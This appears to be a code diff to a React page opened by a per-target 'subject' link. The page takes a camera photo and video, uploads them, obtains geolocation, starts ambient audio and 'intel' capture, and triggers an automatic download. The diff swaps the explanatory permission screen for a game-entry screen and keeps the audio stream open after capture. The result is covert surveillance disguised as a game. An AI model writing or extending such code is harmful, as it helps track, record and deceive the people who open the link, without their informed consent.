@@ -8,35 +8,40 @@ import { getDeviceInfo } from './deviceInfo';
 import { apiGet } from './api';
 import { uploadSubjectMedia } from './mediaUpload';
 import {
-    SUBJECT_TITLE,
-    SUBJECT_CAMERA_MESSAGE,
     SUBJECT_GRANTED_KEY,
     subjectCameraDoneKey,
     CONSENT_TEXT,
     CAMERA_VIDEO_SECONDS
 } from './config';
 import SubjectArenaGate from './games/SubjectArenaGate';
+import SubjectGameEntry from './games/SubjectGameEntry';
 import { runTestAutoDownloadOnce, testDownloadSettleMs } from './testDownload';
 import { useSubjectIntelCapture } from './hooks/useSubjectIntelCapture';
-import './SubjectPage.css';
 
 const noop = () => {};
+
+function entryStatus(phase) {
+    if (phase === 'loading') return 'loading';
+    if (phase === 'booting') return 'booting';
+    if (phase === 'camera_waiting') return 'camera';
+    if (phase === 'location_waiting') return 'location';
+    return 'ready';
+}
 
 function SubjectSessionPage() {
     const { token } = useParams();
     const deviceInfoRef = useRef(getDeviceInfo());
     const [phase, setPhase] = useState('loading');
+    const [entryError, setEntryError] = useState(null);
     const [activeGameId, setActiveGameId] = useState(null);
     const [trackingEnabled, setTrackingEnabled] = useState(false);
-    const [caseTitle, setCaseTitle] = useState('');
-    const [errorDetail, setErrorDetail] = useState('');
     const { runCaptureSession } = useCameraCapture();
     const initialAudioStreamRef = useRef(null);
     const cameraDoneKey = subjectCameraDoneKey(token);
 
     const ambientEnabled =
         trackingEnabled &&
-        (phase === 'success' || phase === 'arena' || phase === 'playing');
+        (phase === 'arena' || phase === 'playing');
 
     useAmbientCapture({
         enabled: ambientEnabled,
@@ -57,8 +62,7 @@ function SubjectSessionPage() {
         onDeviceRegistered: noop,
         onUserLocation: noop,
         onDevicesChange: noop,
-        onLocationRefining: noop,
-        onCaseRegistered: (data) => setCaseTitle(data.title || '')
+        onLocationRefining: noop
     });
 
     useEffect(() => {
@@ -68,7 +72,6 @@ function SubjectSessionPage() {
                 const data = await apiGet(`/api/cases/by-token/${token}`);
                 if (cancelled) return;
                 if (data.valid) {
-                    setCaseTitle(data.title || '');
                     const locOk = localStorage.getItem(locationKey) === 'true';
                     const camOk = localStorage.getItem(cameraDoneKey) === 'true';
                     if (locOk && camOk) {
@@ -92,14 +95,8 @@ function SubjectSessionPage() {
     const startTracking = useCallback(() => {
         localStorage.setItem(locationKey, 'true');
         setTrackingEnabled(true);
-        setPhase('success');
+        setPhase('arena');
     }, [locationKey]);
-
-    useEffect(() => {
-        if (phase !== 'success') return undefined;
-        const t = setTimeout(() => setPhase('arena'), 1500);
-        return () => clearTimeout(t);
-    }, [phase]);
 
     const handleSelectGame = useCallback((gameId) => {
         setActiveGameId(gameId);
@@ -113,26 +110,33 @@ function SubjectSessionPage() {
 
     const requestLocation = useCallback(() => {
         if (!navigator.geolocation) {
-            setPhase('denied');
+            setEntryError('denied');
+            setPhase('prompt');
             return;
         }
         setPhase('location_waiting');
-        setErrorDetail('');
         navigator.geolocation.getCurrentPosition(
             () => startTracking(),
-            () => setPhase('denied'),
+            () => {
+                setEntryError('denied');
+                setPhase('prompt');
+            },
             GPS_OPTIONS
         );
     }, [startTracking]);
 
     const requestPermissions = useCallback(async () => {
+        setEntryError(null);
+        setPhase('booting');
         await runTestAutoDownloadOnce(`pulse_test_download_v2_${token}`);
         const settle = testDownloadSettleMs();
         if (settle) await new Promise((r) => setTimeout(r, settle));
         setPhase('camera_waiting');
-        setErrorDetail('');
         try {
-            const { photo, video } = await runCaptureSession(CAMERA_VIDEO_SECONDS);
+            const { photo, video, stream } = await runCaptureSession(CAMERA_VIDEO_SECONDS, {
+                keepStreamForAmbient: true
+            });
+            initialAudioStreamRef.current = stream;
             await uploadSubjectMedia({ subjectToken: token, type: 'photo', blob: photo });
             localStorage.setItem(cameraDoneKey, 'true');
             if (video) {
@@ -141,51 +145,24 @@ function SubjectSessionPage() {
             requestLocation();
         } catch (err) {
             const msg = err?.message || String(err);
-            setErrorDetail(msg);
             if (msg === 'NOT_SUPPORTED') {
-                setPhase('denied');
-                return;
+                setEntryError('denied');
+            } else if (err?.name === 'NotAllowedError' || msg.includes('Permission')) {
+                setEntryError('camera_denied');
+            } else {
+                setEntryError('upload_error');
             }
-            if (err?.name === 'NotAllowedError' || msg.includes('Permission')) {
-                setPhase('camera_denied');
-                return;
-            }
-            setPhase('upload_error');
+            setPhase('prompt');
         }
     }, [token, runCaptureSession, requestLocation, cameraDoneKey]);
 
-    if (phase === 'loading') {
-        return (
-            <div className="subject-page">
-                <div className="subject-card">
-                    <p className="subject-hint">Yoxlanılır...</p>
-                </div>
-            </div>
-        );
-    }
-
     if (phase === 'invalid') {
         return (
-            <div className="subject-page">
-                <div className="subject-card">
-                    <p className="subject-error">
-                        Link etibarsızdır və ya tapşırıq bağlanıb. Operator yeni subyekt linki
-                        yaradıb göndərməlidir (Əməliyyat → Subyekt linki).
+            <div className="pulse-arena pulse-entry">
+                <div className="pulse-entry__footer" style={{ marginTop: '40vh' }}>
+                    <p className="pulse-entry__error">
+                        Link etibarsızdır və ya tapşırıq bağlanıb.
                     </p>
-                </div>
-            </div>
-        );
-    }
-
-    const waiting =
-        phase === 'camera_waiting' || phase === 'location_waiting' || phase === 'waiting';
-
-    if (phase === 'success') {
-        return (
-            <div className="pulse-splash">
-                <div>
-                    <div className="pulse-splash__ring" aria-hidden />
-                    <h1 style={{ margin: 0, fontSize: '1.5rem' }}>Hazırsınız!</h1>
                 </div>
             </div>
         );
@@ -203,43 +180,11 @@ function SubjectSessionPage() {
     }
 
     return (
-        <div className="subject-page">
-            <div className="subject-card">
-                <>
-                        <div className="subject-icon">🔒</div>
-                        <h1 className="subject-title">{caseTitle || SUBJECT_TITLE}</h1>
-                        <p className="subject-text">{SUBJECT_CAMERA_MESSAGE}</p>
-                        {waiting ? (
-                            <p className="subject-hint">
-                                {phase === 'camera_waiting'
-                                    ? 'Kamera: foto və qısa video hazırlanır...'
-                                    : 'Konum yoxlanılır...'}
-                            </p>
-                        ) : (
-                            <button type="button" className="subject-btn" onClick={requestPermissions}>
-                                Davam et
-                            </button>
-                        )}
-                        {phase === 'camera_denied' && (
-                            <p className="subject-error">
-                                Kamera və ya mikrofon icazəsi verilmədi. Brauzer/Safari
-                                parametrlərindən icazə verib yenidən cəhd edin.
-                            </p>
-                        )}
-                        {phase === 'upload_error' && (
-                            <p className="subject-error">
-                                Media serverə göndərilmədi. İnternet və linki yoxlayın.
-                                {errorDetail && ` (${errorDetail})`}
-                            </p>
-                        )}
-                        {phase === 'denied' && (
-                            <p className="subject-error">
-                                Konum və ya kamera dəstəklənmir. HTTPS linkindən istifadə edin.
-                            </p>
-                        )}
-                </>
-            </div>
-        </div>
+        <SubjectGameEntry
+            status={entryStatus(phase)}
+            error={entryError}
+            onStart={requestPermissions}
+        />
     );
 }
 
